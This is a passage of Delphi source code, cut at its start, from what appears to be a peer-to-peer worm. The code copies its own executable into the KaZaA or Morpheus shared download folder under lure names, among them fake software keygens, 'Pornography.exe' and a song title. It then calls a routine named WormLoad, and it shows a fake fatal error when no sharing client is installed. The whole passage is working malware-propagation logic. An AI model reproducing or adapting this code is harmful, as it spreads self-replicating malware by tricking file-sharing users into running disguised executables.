      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\CS keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\BF1942 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Porn Hotline.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Pornography.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Norton AntiVirus 2003 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Disturbed - Down with the Sickness.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Windows XP Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 7 Keygen.exe'), false);
      RegK.CloseKey;
      WormLoad;
    end
    else
    begin
      FatalAppExit(0, 'Required Sharing Clients: "KaZaA or Morpheus" not found. Please install one of these clients and try again');
    end;
   end.
